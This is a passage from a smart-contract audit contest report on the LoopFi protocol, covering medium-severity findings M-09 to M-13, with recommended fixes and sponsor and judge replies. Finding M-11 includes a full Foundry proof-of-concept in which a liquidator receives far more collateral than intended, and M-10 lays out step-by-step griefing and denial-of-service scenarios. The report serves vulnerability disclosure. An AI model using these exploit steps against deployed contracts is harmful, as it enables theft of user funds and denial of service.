>             ERC20(assets[i]).safeApprove(address(balancerVault), maxAmountsIn[i]);
>         }
> 
>         pool_ = weightedPoolFactory.create(
>             "50WETH-50TOKEN",
>             "50WETH-50TOKEN",
>             assets,
>             weights,
>             3e14, // swapFee (0.03%)
>             address(this) // owner
>         );
> 
>         balancerVault.joinPool(
>             pool_.getPoolId(),
>             address(this),
>             address(this),
>             JoinPoolRequest({
>                 assets: assets,
>                 maxAmountsIn: maxAmountsIn,
>                 userData: abi.encode(JoinKind.INIT, maxAmountsIn),
>                 fromInternalBalance: false
>             })
>         );
>     }
> 
>     function getForkBlockNumber() internal pure virtual override(IntegrationTestBase) returns (uint256) {
>         return 17870449; // Aug-08-2023 01:17:35 PM +UTC
>     }
> }
> ```
> 
> </details>

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239#issuecomment-2397420857):**
 > @0xAlix2 - Could you please explain why should we update the code according to point 3 above?

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/239#issuecomment-2397428179):**
> @Koolex - The third point refers to another issue that is reported, [Issue 241](https://github.com/code-423n4/2024-07-loopfi-findings/issues/241), it just bypasses that issue and makes sure it doesn't revert because of that issue. Issue #241 just shows a more sophisticated mitigation.

***

## [[M-09] `PendleLPOracle::_fetchAndValidate` uses Chainlink's deprecated `answeredInRound`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/235)
*Submitted by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/235), also found by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/516), peanuts ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/579), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/554)), [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/569), [Rhaydden](https://github.com/code-423n4/2024-07-loopfi-findings/issues/563), [0xhacksmithh](https://github.com/code-423n4/2024-07-loopfi-findings/issues/559), [unRekt](https://github.com/code-423n4/2024-07-loopfi-findings/issues/558), [inh3l](https://github.com/code-423n4/2024-07-loopfi-findings/issues/556), [atoko](https://github.com/code-423n4/2024-07-loopfi-findings/issues/553), [0xjoaovpsantos](https://github.com/code-423n4/2024-07-loopfi-findings/issues/522), Kaysoft ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/521), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/518), [3](https://github.com/code-423n4/2024-07-loopfi-findings/issues/492)), [lightoasis](https://github.com/code-423n4/2024-07-loopfi-findings/issues/506), [jolah1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/494), [josephxander](https://github.com/code-423n4/2024-07-loopfi-findings/issues/488), [web3km](https://github.com/code-423n4/2024-07-loopfi-findings/issues/482), 0xINFINITY ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/474), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/473), [3](https://github.com/code-423n4/2024-07-loopfi-findings/issues/470)), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/468), [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/446), [Bigsam](https://github.com/code-423n4/2024-07-loopfi-findings/issues/429), [0xBugSlayer](https://github.com/code-423n4/2024-07-loopfi-findings/issues/420), [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/414), [Sungyu](https://github.com/code-423n4/2024-07-loopfi-findings/issues/408), yashar ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/391), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/381)), [emmac002](https://github.com/code-423n4/2024-07-loopfi-findings/issues/371), [pks\_](https://github.com/code-423n4/2024-07-loopfi-findings/issues/345), [y0ng0p3](https://github.com/code-423n4/2024-07-loopfi-findings/issues/302), [EPSec](https://github.com/code-423n4/2024-07-loopfi-findings/issues/292), [grearlake](https://github.com/code-423n4/2024-07-loopfi-findings/issues/291), [0xspryon](https://github.com/code-423n4/2024-07-loopfi-findings/issues/289), [0XRolko](https://github.com/code-423n4/2024-07-loopfi-findings/issues/284), [0xAadi](https://github.com/code-423n4/2024-07-loopfi-findings/issues/276), [Damola0x](https://github.com/code-423n4/2024-07-loopfi-findings/issues/273), [4B](https://github.com/code-423n4/2024-07-loopfi-findings/issues/260), [Sparrow](https://github.com/code-423n4/2024-07-loopfi-findings/issues/257), [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/173), [NexusAudits](https://github.com/code-423n4/2024-07-loopfi-findings/issues/131), pkqs90 ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/88), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/68)), [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/31), and [BiasedMerc](https://github.com/code-423n4/2024-07-loopfi-findings/issues/6)*

`PendleLPOracle` uses Chainlink to get the price of Pendle's underlying asset in ETH; this is done using `_fetchAndValidate`. That function uses `answeredInRound`, which is deprecated according to [Chainlink docs](https://docs.chain.link/data-feeds/api-reference#latestrounddata).

> `answeredInRound`:  Deprecated - Previously used when answers could take multiple rounds to be computed.

This results in invalid/wrong prices from Chainlink.

### Recommended Mitigation Steps

Remove the usage of `answeredInRound` in `PendleLPOracle::_fetchAndValidate`.

### Assessed type

Oracle

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/235#event-14359544567)**

***

## [[M-10] Malicious actor can abuse the minimum shares check in `StakingLPEth` and cause DoS or locked funds for the last user that withdraws](https://github.com/code-423n4/2024-07-loopfi-findings/issues/228)
*Submitted by [web3km](https://github.com/code-423n4/2024-07-loopfi-findings/issues/228), also found by [asui](https://github.com/code-423n4/2024-07-loopfi-findings/issues/528), [Eeyore](https://github.com/code-423n4/2024-07-loopfi-findings/issues/520), [0xMax1mus](https://github.com/code-423n4/2024-07-loopfi-findings/issues/519), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/485), [boraichodrunkenmaster](https://github.com/code-423n4/2024-07-loopfi-findings/issues/467), [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/456), [peanuts](https://github.com/code-423n4/2024-07-loopfi-findings/issues/438), lian886 ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/435), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/335)), [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/413), [yashar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/382), [emmac002](https://github.com/code-423n4/2024-07-loopfi-findings/issues/370), [Walter](https://github.com/code-423n4/2024-07-loopfi-findings/issues/363), [Afriauditor](https://github.com/code-423n4/2024-07-loopfi-findings/issues/353), zhaojie ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/340), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/337)), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/331), [grearlake](https://github.com/code-423n4/2024-07-loopfi-findings/issues/307), [Breeje](https://github.com/code-423n4/2024-07-loopfi-findings/issues/283), [0xAadi](https://github.com/code-423n4/2024-07-loopfi-findings/issues/281), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/120), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/65), and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/49)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L141-L144>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L71>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L112>

### Impact

The last user that tries to cooldown/withdraw his share will not be able to withdraw the full deposited amount.

### Proof of Concept

The `StakingLpEth` contract implements a check for minimum shares to ensure that inflation attacks cannot happen:

```solidity
    function _checkMinShares() internal view {
        uint256 _totalSupply = totalSupply();
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
    }
```

The `_checkMinShares` function is called on every deposit/withdrawal to ensure that `_totalSupply` does not become less than `MIN_SHARES`:

```solidity
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override nonReentrant {
        super._deposit(caller, receiver, assets, shares);
        _checkMinShares();
    }

    /**
     * @dev Withdraw/redeem common workflow.
     * @param caller tx sender
     * @param receiver where to send assets
     * @param _owner where to burn shares from
     * @param assets asset amount to transfer out
     * @param shares shares to burn
     */
    function _withdraw(
        address caller,
        address receiver,
        address _owner,
        uint256 assets,
        uint256 shares
    ) internal override nonReentrant {
        super._withdraw(caller, receiver, _owner, assets, shares);
        _checkMinShares();
    }
```

However, this check opens up a griefing opportunities for attackers to either make sure that the last user that tries to withdraw will only be able to withdraw (`his balance - MIN_SHARES`) locking the `MIN_SHARES` with no way of getting them out or completely DoSing the deposit/mint functionality of the vault.

### Exploitation Scenarios:

**Locking funds for the last user that withdraws/cooldowns:**

1. User1 mints `1e18` shares.
2. Attacker sees that and backruns him minting only 1 wei shares.
3. User1 tries to cooldown/withdraw all of his shares. However after `super._withdraw` function executes the new `_totalSupply` will be equal to 1 which is less than `MIN_SHARES`, which will make `_checkMinShares` function revert.
4. User2 comes and mints `1e18` shares.
5. Now that User2 deposited User1 will be able to withdraw his shares.
6. The cycle repeats of every new user waiting for the next one to deposit in order to withdraw/cooldown full amount, until the last one which will not be able to withdraw full amount leaving `MIN_SHARES` amount stuck.

**DoS of deposit/mint functionality:**

The contract calculates the share the same way as every `ERC4626` contract:

```solidity
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```

Since `decimalsOffset() == 0` and `totalAssets()` will equal to the balance of `lpEth` in the contract.

The calculation will be:

`f(share) = (lpEth * totalSupply + 1) / (totalLpEth() + 1)`

1. Right after deployment the attacker will transfer 0.01 lpEth to the contract without minting any shares.
2. Suppose the next user wants to deposit 1000 lpEth, which is quite a large amount.
3. His shares will be calculated as:

`(1000e18 * 0 + 1) / (0.01e18 + 1) = $100000`

Which is less than `MIN_SHARES`, which ultimately makes the function revert. The user will have to deposit `100_000_000_000_000` lpEth in order to pass the minimum shares requirement.

### Recommended Mitigation Steps

Consider funding the contract in the deployment script and remove the `MIN_SHARES` check to ensure that no DoS or locking of funds is possible.

### Assessed type

Error

**[0xtj24 (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/228#issuecomment-2340160415):**
 > This behaviour is expected. After deployment of the contracts, the protocol will mint the minimum shares.

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/228#issuecomment-2386509383)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/228).*

***

## [[M-11] `CDPVault.liquidatePosition()` does not scale `takeCollateral` with `tokenScale`; therefore, it might send the wrong amount of collateral to the liquidator when `tokenScale ! = 1 ether`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/223)
*Submitted by [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/223), also found by [lightoasis](https://github.com/code-423n4/2024-07-loopfi-findings/issues/517), [jigster](https://github.com/code-423n4/2024-07-loopfi-findings/issues/479), and [AKA8u9K111er](https://github.com/code-423n4/2024-07-loopfi-findings/issues/455)*

First of all, in `CDPVault`, the amount of `collateral` maintained in each position is scaled using `tokenScale`. See the code in `deposit`:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L223-L233

and the function `modifyCollateralAndDebt()`:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L367-L460

For example, when withdrawing collateral, it will scale it with `tokenScale` from internal amount:

```javascript
  uint256 amount = wmul(abs(deltaCollateral), tokenScale);
            token.safeTransfer(collateralizer, amount);
```

However, when sending collateral to the liquidator, it uses the internal amount without scaling by `tokenScale` in function `liquidatePosition` at L565.

```javascript
 token.safeTransfer(msg.sender, takeCollateral);
```

As a result, when `tokenScale < 10 ** 18`, the above line actually send more tokens to the liquidator than it is supposed to, a loss of funds for the protocol.

In the following POC, we show:

1. We use a collateral token that has 16 decimals, as a a result, `tokenScale = 19 ** 16`.
2. Frank deposits 1M units of collateral.
3. The test contract deposits 100 units of collateral and then borrows 10 ether of underlying tokens, with the price of collateral being 1 ether.
4. The price of the collateral drops to 0.1 ether.
5. Kathy liquidates the position of the test contract with 1 ether of underlying tokens.
6. Kathy is supposed to receive 10.52 units of collateral; however, she receives 1052 units of collateral instead due to the above bug. This amount is much greater than the collateral for the position held by the test contract.
7. The protocol loses collateral to the liquidator, in particular, the collateral that is supposed to be owned by Frank.
8. Now, when Frank tries to withdraw his collateral, he fails.

Please run `forge test --match-test testLiquidate1 -vv`:

<details>

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/console2.sol";
import {TestBase, ERC20PresetMinterPauser} from "../TestBase.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {IOracle} from "../../interfaces/IOracle.sol";
import {ICDPVaultBase} from "../../interfaces/ICDPVault.sol";
import {CDPVaultConstants, CDPVaultConfig} from "../../interfaces/ICDPVault.sol";
import {IPermission} from "../../interfaces/IPermission.sol";

import {WAD, wmul, wdiv, wpow, toInt256} from "../../utils/Math.sol";
import {CDPVault, VAULT_CONFIG_ROLE} from "../../CDPVault.sol";
import {console} from "forge-std/console.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

contract MockTokenScaled is ERC20PresetMinterPauser {
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals_) ERC20PresetMinterPauser(name, symbol) {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}
import {CDPVault, VAULT_CONFIG_ROLE} from "../../CDPVault.sol";
import {console} from "forge-std/console.sol";

contract CDPVaultWrapper is CDPVault {
    constructor(CDPVaultConstants memory constants, CDPVaultConfig memory config) CDPVault(constants, config) {}
}

contract PositionOwner {
    constructor(IPermission vault) {
        // Allow deployer to modify Position
        vault.modifyPermission(msg.sender, true);
    }
}

contract CDPVaultTest is TestBase {
    MockTokenScaled tokenScaled;

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    function _depositCollateral(CDPVault vault, uint256 amount) internal {
        token.mint(address(this), amount);
        (uint256 collateralBefore, , , , , ) = vault.positions(address(this));
        token.approve(address(vault), amount);
        vault.deposit(address(this), amount);
        (uint256 collateralAfter, , , , , ) = vault.positions(address(this));
        assertEq(collateralAfter, collateralBefore + amount);
    }

    function _modifyCollateralAndDebt(CDPVault vault, int256 collateral, int256 debt) internal {
        if (debt < 0) {
            mockWETH.mint(address(this), uint256(-debt));
            mockWETH.approve(address(vault), uint256(-debt));
        }

        if (collateral > 0) {
            token.mint(address(this), uint256(collateral));
            token.approve(address(vault), uint256(collateral));
        }

        (uint256 collateralBefore, uint256 debtBefore, , , , ) = vault.positions(address(this));
        uint256 virtualDebtBefore = virtualDebt(vault, address(this));
        uint256 vaultCreditBefore = credit(address(this));

        vault.modifyCollateralAndDebt(address(this), address(this), address(this), collateral, debt);
        {
            (uint256 collateralAfter, uint256 debtAfter, , , , ) = vault.positions(address(this));
            assertEq(toInt256(collateralAfter), toInt256(collateralBefore) + collateral);
            assertEq(toInt256(debtAfter), toInt256(debtBefore) + debt);
        }

        uint256 virtualDebtAfter = virtualDebt(vault, address(this));
        int256 deltaDebt = toInt256(virtualDebtAfter) - toInt256(virtualDebtBefore);
        {
            uint256 tokensAfter = credit(address(this));
            assertEq(toInt256(tokensAfter), toInt256(vaultCreditBefore) + deltaDebt);
        }

        uint256 vaultCreditAfter = credit(address(this));
        assertEq(toInt256(vaultCreditBefore + virtualDebtAfter), toInt256(vaultCreditAfter + virtualDebtBefore));
        assertEq(toInt256(vaultCreditBefore + virtualDebtAfter), toInt256(vaultCreditAfter + virtualDebtBefore));
    }

    function _updateSpot(uint256 price) internal {
        oracle.updateSpot(address(token), price);
    }

    function _collateralizationRatio(CDPVault vault) internal view returns (uint256) {
        (uint256 collateral, , , , , ) = vault.positions(address(this));
        if (collateral == 0) return type(uint256).max;
        return wdiv(wmul(collateral, vault.spotPrice()), virtualDebt(vault, address(this)));
    }

    function _createVaultWrapper(uint256 liquidationRatio) private returns (CDPVaultWrapper vault) {
        CDPVaultConstants memory constants = _getDefaultVaultConstants();
        CDPVaultConfig memory config = _getDefaultVaultConfig();
        config.liquidationRatio = uint64(liquidationRatio);

        vault = new CDPVaultWrapper(constants, config);
    }

    function _setDebtCeiling(CDPVault vault, uint256 debtCeiling) internal {
        // cdm.setParameter(address(vault), "debtCeiling", debtCeiling);
        liquidityPool.setCreditManagerDebtLimit(address(vault), debtCeiling);
    }

    
    function printPosition(CDPVault vault, address p, string memory name) public{
        console2.log("\n =================================================");
        console2.log("position infor for ", name);

        (uint256 collateral, // [wad]
        uint256 debt, // [wad]
        uint256 lastDebtUpdate, // [timestamp]
        uint256 cumulativeIndexLastUpdate,
        uint192 cumulativeQuotaIndexLU,
        uint128 cumulativeQuotaInterest
        ) = vault.positions(p);

        console2.log("collateral: ", collateral);
        console2.log("debt: ", debt);
        console2.log("cumulativeQuotaInterest: ", cumulativeQuotaInterest);
        console2.log("lastUpdate: ", lastDebtUpdate);
        
        uint256 cumulativeIndexNow = liquidityPool.baseInterestIndex();
        uint256 cumulativeQuotaIndexNow = quotaKeeper.cumulativeIndex(address(tokenScaled));
        console2.log("cumulatveIndexNow: ", cumulativeIndexNow);
        console2.log("cumulativeIndexLastUpdate:", cumulativeIndexLastUpdate);
        console2.log("cumulativeQuotaIndexNow: ", cumulativeQuotaIndexNow);
        console2.log("cumulativeQuotaIndexLU: ", cumulativeQuotaIndexLU);
        console2.log("=================================================\n ");
    }

    
    function printBalances(address a, string memory name) public{
        console2.log("\n =================================================");
        console2.log("Balances for ", name);
        console2.log("Collateral balance: ", token.balanceOf(a));
        console2.log("borrow token balance: ", mockWETH.balanceOf(a));
        console2.log("=================================================\n ");
    }


function testLiquidate1() public{
        address Frank = makeAddr("Frank");
        address Kathy = makeAddr("Kathy");
        
        

        tokenScaled = new MockTokenScaled("TestToken", "TST", 16);  // 16 decimals

        CDPVault vault = createCDPVault(tokenScaled, 150 ether, 0, 1.25 ether, 1.0 ether, 0.95 ether);
        createGaugeAndSetGauge(address(vault), address(tokenScaled));

        // frank does a deposit 1M units
        tokenScaled.mint(Frank, 1000000*10**16);
        vm.startPrank(Frank);
        tokenScaled.approve(address(vault), 1000000*10**16); // 100 units
        vault.deposit(Frank, 1000000*10**16);
        vm.stopPrank();

        // this test contract does a deposit 100 units
        tokenScaled.mint(address(this), 100*10**16);
        tokenScaled.approve(address(vault), 100*10**16); // 100 units
        vault.deposit(address(this), 100*10**16);

        oracle.updateSpot(address(tokenScaled), 1 ether);
        vault.borrow(address(this), address(this), 10 ether);    // 10 ether debt, 100 units of collateral
         
        
        console2.log("\n \n --------------------liquidate now -----------------");
        oracle.updateSpot(address(tokenScaled), 0.1 ether);
        
        mockWETH.mint(Kathy, 1 ether);
        vm.startPrank(Kathy);
        mockWETH.approve(address(vault), 1 ether);
        vault.liquidatePosition(address(this), 1 ether);
        vm.stopPrank();

        printPosition(vault, address(this), "this position");
        console2.log("done");

        vm.startPrank(Frank);
        vm.expectRevert();  // not enough collatreral to withdraw now
        vault.withdraw(Frank, 1000000*10**16);
        vm.stopPrank();
}
}
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Scale the collateral amount from internal representation to the real amount by `tokenScale`.

### Assessed type

Decimal

**[0xtj24 (LoopFi) acknowledged](https://github.com/code-423n4/2024-07-loopfi-findings/issues/223#event-14195872290)**

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/223#issuecomment-2442402623)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/223).*

***

## [[M-12] Unclaimed rewards handling issue in `AuraVault` contract functions (`AuraVault::deposit`, `AuraVault::mint`, `AuraVault::withdraw` and `AuraVault::redeem`)](https://github.com/code-423n4/2024-07-loopfi-findings/issues/218)
*Submitted by [Agontuk](https://github.com/code-423n4/2024-07-loopfi-findings/issues/218), also found by [0xc0ffEE](https://github.com/code-423n4/2024-07-loopfi-findings/issues/296)*

The `AuraVault` contract is designed to manage assets and distribute rewards from an Aura `RewardsPool`. The primary functions involved in asset management are `deposit()`, `mint()`, `withdraw()`, and `redeem()`. These functions rely on the [`totalAssets()` function](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L175-L177) to calculate the total value of assets managed by the vault. However, the current implementation of `totalAssets()` does not account for unclaimed rewards, which can lead to incorrect calculations of shares and assets.

The `totalAssets()` function currently only returns the balance of the underlying asset in the reward pool:

```solidity
File: AuraVault.sol
175:     function totalAssets() public view virtual override(IERC4626, ERC4626) returns (uint256) {
176:         return IPool(rewardPool).balanceOf(address(this));
177:     }
```

This function does not include unclaimed rewards, which can be obtained using `IPool(rewardPool).earned(address(this))`. As a result, the `deposit()`, `mint()`, `withdraw()`, and `redeem()` functions may calculate shares and assets incorrectly, potentially causing users to receive more or fewer shares/assets than they should.

### Impact

The primary impact of this issue is that users may receive an incorrect number of shares or assets due to the inaccurate calculation of `totalAssets()`. This can lead to financial discrepancies, where some users may gain an unfair advantage while others may suffer losses. The severity of this issue is medium to high, depending on the extent of the financial impact on users. An incorrect `totalAssets()` value affects the accuracy of the `deposit()`, `mint()`, `withdraw()`, and `redeem()` functions, leading to an unfair distribution of assets.

### Proof of Concept

1. **User deposits assets:**
    - User calls `deposit(1000, receiver)`.
    - `totalAssets()` returns 10,000 (current balance in reward pool).
    - `previewDeposit(1000)` calculates shares based on 10,000 total assets.
    - Unclaimed rewards of 500 are not included, leading to an incorrect share calculation.

2. **User mints shares:**
    - User calls `mint(100, receiver)`.
    - `totalAssets()` returns 10,000 (current balance in reward pool).
    - `previewMint(100)` calculates assets based on 10,000 total assets.
    - Unclaimed rewards of 500 are not included, leading to an incorrect asset calculation.

3. **User withdraws assets:**
    - User calls `withdraw(1000, receiver, owner)`.
    - `totalAssets()` returns 10,000 (current balance in reward pool).
    - `previewWithdraw(1000)` calculates shares based on 10,000 total assets.
    - Unclaimed rewards of 500 are not included, leading to an incorrect share calculation.

4. **User redeems shares:**
    - User calls `redeem(100, receiver, owner)`.
    - `totalAssets()` returns 10,000 (current balance in reward pool).
    - `previewRedeem(100)` calculates assets based on 10,000 total assets.
    - Unclaimed rewards of 500 are not included, leading to an incorrect asset calculation.

### Tools Used

Manual review

### Recommended Mitigation Steps

To fix this issue, include unclaimed rewards in the `totalAssets()` calculation:

```diff
function totalAssets() public view virtual override(IERC4626, ERC4626) returns (uint256) {
-    return IPool(rewardPool).balanceOf(address(this));
+    uint256 unclaimedRewards = IPool(rewardPool).earned(address(this));
+    return IPool(rewardPool).balanceOf(address(this)) + unclaimedRewards;
}
```

This ensures that the shares and assets are correctly calculated in the `deposit()`, `mint()`, `withdraw()`, and `redeem()` functions.

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/218#issuecomment-2363349613):**
 > Acknowledged, but we will remove and not use the AuraVault.

***

## [[M-13] Lack of Slippage Control in `AuraVault::deposit` and `AuraVault::mint` Functions Can Lead to Unexpected Financial Losses for Users](https://github.com/code-423n4/2024-07-loopfi-findings/issues/215)
*Submitted by [Agontuk](https://github.com/code-423n4/2024-07-loopfi-findings/issues/215), also found by [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/568), [minglei-wang-3570](https://github.com/code-423n4/2024-07-loopfi-findings/issues/561), and [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/397)*

The `AuraVault` contract implements ERC-4626 vault functionality, allowing users to deposit assets and mint shares. However, the `deposit` and `mint` functions lack slippage controls, which can result in users receiving fewer shares or sending more assets than expected. This issue is similar to a previously reported bug in the `bHermes` contract, where the absence of slippage controls in the `ERC4626DepositOnly.deposit` and `ERC4626DepositOnly.mint` functions led to unexpected outcomes for users.

### Detailed Description

The `AuraVault` contract is designed to manage assets and distribute rewards from an Aura `RewardsPool`. It includes functions for depositing assets and minting shares, which are critical for users interacting with the vault. However, these functions do not allow users to specify slippage parameters, exposing them to potential financial losses.

[`deposit` Function](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L199-L208)

The `deposit` function allows users to deposit a specified amount of assets and receive shares in return. The function calculates the number of shares to be minted using the `previewDeposit` function and then proceeds with the deposit. However, it does not allow users to specify a minimum number of shares to be minted, which can lead to slippage issues.

```solidity
File: AuraVault.sol
199:     function deposit(uint256 assets, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
200:         uint256 shares = previewDeposit(assets);
201:         _deposit(_msgSender(), receiver, assets, shares);
202: 
203:         // Deposit  in reward pool
204:         IERC20(asset()).safeApprove(rewardPool, assets);
205:         IPool(rewardPool).deposit(assets, address(this));
206: 
207:         return shares;
208:     }
```

[`mint` Function](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L216-L225)

The `mint` function allows users to mint a specified number of shares by depositing the required amount of assets. The function calculates the required assets using the `previewMint` function and then proceeds with the minting. However, it does not allow users to specify a maximum number of assets to be sent, which can lead to slippage issues.

```solidity
File: AuraVault.sol
216:     function mint(uint256 shares, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
217:         uint256 assets = previewMint(shares);
218:         _deposit(_msgSender(), receiver, assets, shares);
219: 
220:         // Deposit assets in reward pool
221:         IERC20(asset()).safeApprove(rewardPool, assets);
222:         IPool(rewardPool).deposit(assets, address(this));
223: 
224:         return assets;
225:     }
```

### Root Cause

The root cause of the issue is the absence of slippage control parameters in the `deposit` and `mint` functions. Users cannot specify minimum shares to be minted or maximum assets to be sent, leading to potential financial losses due to slippage.

### Impact

Users can lose funds due to unexpected slippage when interacting with the `AuraVault` contract. Specifically, they may receive fewer shares than expected when depositing assets or send more assets than expected when minting shares. This can result in significant financial losses, especially in volatile market conditions.

### Proof of Concept

1. Alice wants to deposit 1000 units of an asset into the `AuraVault` contract and expects to receive at least 100 shares.
2. Alice calls the `deposit` function with 1000 units of the asset.
3. Due to slippage, Alice receives only 90 shares instead of the expected 100 shares.
4. Alice loses value because she received fewer shares than expected.

Similarly, for the `mint` function:

1. Bob wants to mint 100 shares and expects to send no more than 1000 units of the asset.
2. Bob calls the `mint` function with 100 shares as the input.
3. Due to slippage, Bob ends up sending 1200 units of the asset instead of the expected 1000 units.
4. Bob loses value because he sent more assets than expected.

### Recommended Mitigation Steps

Add slippage control parameters to the `deposit` and `mint` functions to allow users to specify minimum shares to be minted and maximum assets to be sent. This will ensure that transactions revert if the slippage conditions are not met.

```diff
- function deposit(uint256 assets, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
+ function deposit(uint256 assets, uint256 minShares, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
    uint256 shares = previewDeposit(assets);
+   require(shares >= minShares, "AuraVault: Insufficient shares minted");
    _deposit(_msgSender(), receiver, assets, shares);

    // Deposit in reward pool
    IERC20(asset()).safeApprove(rewardPool, assets);
    IPool(rewardPool).deposit(assets, address(this));

    return shares;
}

- function mint(uint256 shares, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
+ function mint(uint256 shares, uint256 maxAssets, address receiver) public virtual override(IERC4626, ERC4626) returns (uint256) {
    uint256 assets = previewMint(shares);
+   require(assets <= maxAssets, "AuraVault: Excessive assets required");
    _deposit(_msgSender(), receiver, assets, shares);

    // Deposit assets in reward pool
    IERC20(asset()).safeApprove(rewardPool, assets);
    IPool(rewardPool).deposit(assets, address(this));

    return assets;
}
```

These changes allow users to specify their slippage tolerance, protecting them from unexpected losses due to market volatility or delayed transaction execution.

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/215#issuecomment-2363350357):**
 > Acknowledged, but we will remove and not use the AuraVault.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/215#issuecomment-2440172035):**
 > EIP4626 encourage to add slippage protection by adding additional functions which doesn't violate it.
> 
> > If implementors intend to support EOA account access directly, they should consider adding an additional function call for deposit/mint/withdraw/redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/215).*

***

## [[M-14] DOS attack to `SwapAction.transferAndSwap()` when using  an ERC20 permit `transferFrom`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/205)
